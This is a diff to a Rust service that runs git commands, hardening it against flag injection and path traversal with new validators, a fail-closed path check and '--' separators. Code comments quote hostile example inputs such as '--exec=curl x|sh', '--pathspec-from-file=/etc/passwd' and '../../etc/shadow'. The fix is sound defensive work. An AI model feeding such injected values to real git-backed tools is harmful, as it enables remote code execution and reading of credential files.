@@ -136,11 +136,46 @@ fn validate_commit_message(msg: &str) -> Result<(), String> {
     if msg.trim().is_empty() {
         return Err("commit message must not be empty".to_string());
     }
-    let lower = msg.to_lowercase();
-    for forbidden in &["--force", "--no-verify", "--allow-empty"] {
-        if lower.contains(forbidden) {
-            return Err(format!("forbidden flag in message: {forbidden}"));
+    // P0-18: the previous substring check for "--force" / "--no-verify" in
+    // the message body was pointless — `-m <msg>` passes the message as a
+    // single argv slot and git never parses it as flags. Worse, it rejected
+    // legitimate messages like "revert the --force flag experiment". The
+    // real risk was on the flags handed to git elsewhere; that's now guarded
+    // by `is_safe_ref` / explicit `--` separators.
+    Ok(())
+}
+
+/// Reject anything that could reach `git` as a flag or shell metacharacter.
+/// Callers use this for refs, commit hashes, and any string that becomes an
+/// argv element for git. A leading `-` is fatal (git parses it as a flag,
+/// e.g. `--exec=…` in rebase / cherry-pick); slashes are allowed *only* if
+/// callers explicitly permit them (e.g. `refs/heads/foo`); nothing outside
+/// `[A-Za-z0-9_./-]` is allowed.
+fn is_safe_ref(s: &str) -> Result<(), String> {
+    if s.is_empty() {
+        return Err("value must not be empty".to_string());
+    }
+    if s.starts_with('-') {
+        return Err(format!(
+            "value must not start with `-` (would be parsed as a git flag): {s}"
+        ));
+    }
+    for ch in s.chars() {
+        if !(ch.is_ascii_alphanumeric() || matches!(ch, '_' | '.' | '/' | '-')) {
+            return Err(format!(
+                "value contains disallowed character `{ch}`: {s}"
+            ));
         }
+    }
+    Ok(())
+}
+
+/// Same as `is_safe_ref` but forbids `/` — for commit-hash-like values that
+/// must never be a ref path.
+fn is_safe_hash(s: &str) -> Result<(), String> {
+    is_safe_ref(s)?;
+    if s.contains('/') {
+        return Err(format!("commit hash must not contain `/`: {s}"));
     }
     Ok(())
 }
@@ -159,9 +194,47 @@ fn resolve_root(req_root: Option<&str>) -> Result<PathBuf, String> {
 }
 
 fn validate_path_in_root(root: &Path, rel: &str) -> Result<(), String> {
+    // P0-19: fail-closed. Previously an inability to canonicalise (e.g. a
+    // still-uncommitted new file, or a symlink loop) silently fell back to
+    // the raw joined path, letting `../../etc/shadow` slip past
+    // `starts_with` because both sides shared the unresolved prefix. Now:
+    // canonicalise the target when it exists; otherwise canonicalise the
+    // deepest existing ancestor and re-attach the tail. If neither works,
+    // reject the path outright.
+    let canonical_root = root
+        .canonicalize()
+        .map_err(|_| format!("fixtures_root not accessible: {}", root.display()))?;
     let resolved = root.join(rel);
-    let canonical = resolved.canonicalize().unwrap_or(resolved.clone());
-    let canonical_root = root.canonicalize().unwrap_or(root.to_path_buf());
+    let canonical = match resolved.canonicalize() {
+        Ok(p) => p,
+        Err(_) => {
+            let mut ancestors: Vec<&Path> = Vec::new();
+            let mut current = resolved.as_path();
+            let existing = loop {
+                if current.exists() {
+                    break current.canonicalize().map_err(|e| {
+                        format!("failed to canonicalise existing ancestor: {e}")
+                    })?;
+                }
+                match current.parent() {
+                    Some(parent) => {
+                        ancestors.push(current);
+                        current = parent;
+                    }
+                    None => {
+                        return Err(format!("path has no accessible ancestor: {rel}"));
+                    }
+                }
+            };
+            let mut composed = existing;
+            for tail in ancestors.iter().rev() {
+                if let Some(name) = tail.file_name() {
+                    composed.push(name);
+                }
+            }
+            composed
+        }
+    };
     if !canonical.starts_with(&canonical_root) {
         return Err(format!("path escapes fixtures_root: {rel}"));
     }
@@ -271,7 +344,12 @@ fn handle_commit(req: &GitRequest) -> Result<GitResponse, String> {
         for p in file_paths {
             validate_path_in_root(&root, p)?;
         }
-        let mut args = vec!["add"];
+        // P0-18: user-provided path starting with `-` (e.g. `-p`,
+        // `--interactive`, `--pathspec-from-file=/etc/passwd`) would be
+        // interpreted by `git add` as a flag. Insert the explicit `--`
+        // pathspec separator so every subsequent element is treated as a
+        // path, not a flag.
+        let mut args = vec!["add", "--"];
         args.extend(file_paths.iter().map(|s| s.as_str()));
         run_git(&root, &args)?;
     } else {
@@ -310,7 +388,12 @@ fn handle_reset(req: &GitRequest) -> Result<GitResponse, String> {
         other => return Err(format!("invalid reset mode: {other}. Use soft, mixed, or hard")),
     }
 
-    // Validate target is not dangerous
+    // P0-18: reject anything that git could parse as a flag or that touches
+    // shell/path metacharacters. Combined with the explicit `--` separator
+    // this closes `--exec=…` / `--onto=…` injection through `target`.
+    is_safe_ref(target)?;
+
+    // Also block remote refs (semantic guard, not injection).
     let target_lower = target.to_lowercase();
     for forbidden in &["origin/", "upstream/", "remote"] {
         if target_lower.contains(forbidden) {
@@ -318,6 +401,10 @@ fn handle_reset(req: &GitRequest) -> Result<GitResponse, String> {
         }
     }
 
+    // Note: no `--` separator here — `git reset --<mode> <target>` is
+    // tree-ish form; a `--` between them would flip it into pathspec form.
+    // `is_safe_ref(target)` already guarantees `target` cannot begin with
+    // `-`, so git will never parse it as a flag.
     let (stdout, _) = run_git(&root, &["reset", &format!("--{mode}"), target])?;
     let (head, _) = run_git(&root, &["rev-parse", "HEAD"])?;
 
@@ -342,7 +429,11 @@ fn handle_rebase(req: &GitRequest) -> Result<GitResponse, String> {
     let root = resolve_root(req.fixtures_root.as_deref())?;
     let onto = req.onto.as_deref().ok_or("rebase requires 'onto' parameter")?;
 
-    // Safety: block remote branches
+    // P0-18: block flag / metacharacter injection. Without this,
+    // `--exec=curl x|sh` in `onto` would be treated as a rebase flag.
+    is_safe_ref(onto)?;
+
+    // Safety: block remote branches (semantic guard, not injection).
     let onto_lower = onto.to_lowercase();
     for forbidden in &["origin/", "upstream/", "remote"] {
         if onto_lower.contains(forbidden) {
@@ -418,16 +509,16 @@ fn handle_cherry_pick(req: &GitRequest) -> Result<GitResponse, String> {
         return Err("commits must not be empty".to_string());
     }
 
-    // Validate commit hashes don't reference remotes
+    // Validate commit hashes: no metachars, no `/` (remote-ref shape), no
+    // leading `-` (git flag). P0-18: `--exec=…` in a commit list previously
+    // slipped past the naive `/` + empty check.
     for c in commits {
-        if c.is_empty() {
-            return Err("commit hash must not be empty".to_string());
-        }
-        if c.contains('/') {
-            return Err(format!("commit reference should be a hash, got: {c}"));
-        }
+        is_safe_hash(c)?;
     }
 
+    // `is_safe_hash` above rejects leading `-`, so no commit id can be
+    // parsed as a `cherry-pick` flag. `git cherry-pick` does not consume a
+    // `--` argument (unlike `git add`/`git log`), so we leave it out.
     let mut args = vec!["cherry-pick"];
     args.extend(commits.iter().map(|s| s.as_str()));
 
